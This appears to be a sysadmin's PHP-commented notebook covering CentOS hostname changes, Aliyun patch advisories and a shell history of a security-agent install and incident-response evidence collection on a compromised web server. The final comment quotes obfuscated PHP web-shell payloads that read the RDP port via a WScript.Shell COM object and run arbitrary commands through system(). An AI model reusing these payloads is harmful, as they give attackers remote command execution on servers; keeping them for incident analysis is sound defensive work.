<?php
/*==============================CentOS7下修改主机名===============================

第一种：hostname 主机名

01.hostname 主机名称 

这种方式，只能修改临时的主机名，当重启机器后，主机名称又变回来了。

第二种：hostnamectl set-hostname 主机名 
重启后生效
*/

/*==============================CentOS7下修改主机名===============================
阿里云提示升级高危漏洞 升级内核

	严重(必须)
		yum update gnutls
		
	高危(必须)
		软件: libnl3 3.2.28-3.el7_3
		命中: libnl3 version less than 0:3.2.28-4.el7
		yum update libnl3
		yum update libnl3-cli
		yum update NetworkManager
		yum update NetworkManager-libnm
		yum update NetworkManager-team
		yum update NetworkManager-tui
		yum update NetworkManager-wifi
	高危(必须)
		软件: kernel 3.10.0-514.26.2.el7
		命中: kernel version less than 0:3.10.0-693.el7
		yum update kernel
		yum update kernel-headers
		yum update kernel-tools
		yum update kernel-tools-libs
		yum update python-perf

*/


		/*  wget http://down.safedog.cn/safedog_linux64.tar.gz
  215  ls
  216  tar xzvf safedog_linux64.tar.gz
  217  cd safedog_an_linux64_2.8.20384/
  218  ls
  219  chmod +x *.py
  220  ./install.py
  221  service safedog status
  222  service safedog start
  238  sdcloud  - u 17535851228
  239  cd ~
  240  ls
  241  cd safedog_an_linux32_2.8.20384/
  242  ls
  243  sdcloud  - u 17535851228
  244  sdcloud  -u 17535851228
  245  sdcloud  restart
  246  srrvice sdcloud  restart
  247  service sdcloud  restart
  248  service safedog start
  249  cd /usr/local/nginx/
  250  ls
  251  cd ..
  252  ls
  253  cd /www/server/
  254  ls
  255  cd nginx/
  256  ls
  257  cd conf/
  258  ls
  259  vim vhost/
  260  ls
  261  cd nginx.conf
  262  vim  nginx.conf
  263  vim vhost/
  264  ls
  265  cd ..
  266  ls
  267  cd conf/
  268  ls
  269  grep -r 0.0.0.0:8 *
  270  
  286  grep -r zichends.com:80 *
  28
  289  grep -r zichends.com *
  290  cd ..
  291  grep -r zichends.com *
  292  cd /www/server/panel/
  293  ls
  294  cd vhost/
  295  ls
  296  cd nginx/
  297  ls
  298  vim webzichen_site.com.conf
  299  ls
  300  cd /
  301  ls
  302  exit
  303  ls
  304  who
  305  ls
  306  pwd
  307  ls
  308  mkdir MatrixSecurity
  309  cd MatrixSecurity/
  310  ls
  311  ps -ef >ps_ef.txt
  312  top
  313  netstat -anp >netstat_anp.txt
  314  export HISTIMEFORMAT='%F %T'
  315  history >history_all.txt
  316  vi ./history_all.txt
  317  cd /root/MatrixSecurity/
  318  ls
  319  vi ./history_all.txt
  320  export HISTTIMEFORMAT='%F %T'
  321  history >./history_all2.txt
  322  vi ./netstat_anp.txt
  323  find / -name god.txt
  324  pwd
  325  find / -name router.php
  326  cp -fr /www/wwwroot/webzichen_site.com/public/router.php ./router.php_now_web
  327  cp -fr /www/Recycle_bin/_bt_www_bt_wwwroot_bt_webzichen_site.com_bt_public_t_1512921536.11/router.php  ./rounter.php_recycle
  328  ls
  329  vi ./rounter.php_recycle
  330  cd /www/Recycle_bin/
  331  ls
  332  mkdir /root/MatrixSecurity/recycle_all
  333  cp -fr * /root/MatrixSecurity/recycle_all/
  334  ls
  335  pwd
  336  ls
  337  cut -d : -f 1 /etc/passwd
  338  cut -d : -f 1 /etc/passwd>user_list.txt
  339  vi ./user_list.txt
  340  last
  341  last>last_login_user.txt
  342  vi ./last_login_user.txt
  343  lastb
  344  lastb>user_not_log_ok.txt
  345  ls
  346  cd /root/MatrixSecurity/
  347  ls
  348  last >last_user_log.txt
  349  lastb >last_not_log_ok.txt
  350  vi ./last_not_log_ok.txt
  351  crontab -l
  352  crontab -l> crons_active.txt
  353  vi ./crons_active.txt
  354  vi /www/server/cron/db6035ad7efa4ab371358e68aaa17378.log
  355  vi /www/server/panel/logs/certbot.log
  356  mkdir crons
  357  cp /www/server/cron/db6035ad7efa4ab371358e68aaa17378.log ./crons
  358  cp /www/server/panel/logs/certbot.log ./crons
  359  ls
  360  cd recycle_all/
  361  ls
  362  vi _bt_www_bt_wwwroot_bt_webzichen_site.com_bt_public_bt_订单流程.txt_t_1512896774.31
  363  find / -name 订单流程.txt
  364  pwd
  365  cd ..
  366  mkdir now_folder
  367  cd now_folder/
  368  cp -fr /www/wwwroot/webzichen_site.com/public/订单流程.txt .
  369  ls
  370  vi 订单流程.txt
  371  ls
  372  cd ..
  373  ls
  374  cd recycle_all/
  375  ls
  376  vi _bt_www_bt_wwwroot_bt_xxoo_bt_.htaccess_t_1512937509.9
  377  ls
  378  vi _bt_www_bt_wwwroot_bt_xxoo_bt_.htaccess_t_1512937509.9
  379  cd ..
  380  ls
  381  pwd
  382  ls*/


  /*action:$regpath=chr(72).chr(75).chr(69).chr(89).chr(95).chr(76).chr(79).chr(67).chr(65).chr(76).chr(95).chr(77).chr(65).chr(67).chr(72).chr(73).chr(78).chr(69).chr(92).chr(83).chr(89).chr(83).chr(84).chr(69).chr(77).chr(92).chr(67).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(83).chr(101).chr(116).chr(92).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(92).chr(84).chr(101).chr(114).chr(109).chr(105).chr(110).chr(97).chr(108).chr(32).chr(83).chr(101).chr(114).chr(118).chr(101).chr(114).chr(92).chr(87).chr(100).chr(115).chr(92).chr(114).chr(100).chr(112).chr(119).chr(100).chr(92).chr(84).chr(100).chr(115).chr(92).chr(116).chr(99).chr(112).chr(92).chr(80).chr(111).chr(114).chr(116).chr(78).chr(117).chr(109).chr(98).chr(101).chr(114);

  
$shell= &new COM(chr(87).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46).chr(83).chr(104).chr(101).chr(108).chr(108));var_dump(@$shell->RegRead($regpath)



action:$cmd=;
echo chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(99).chr(111).chr(108).chr(115).chr(61).chr(56).chr(48).chr(32).chr(114).chr(111).chr(119).chr(115).chr(61).chr(50).chr(54).chr(62);
echo system($cmd);
echo chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62);
*/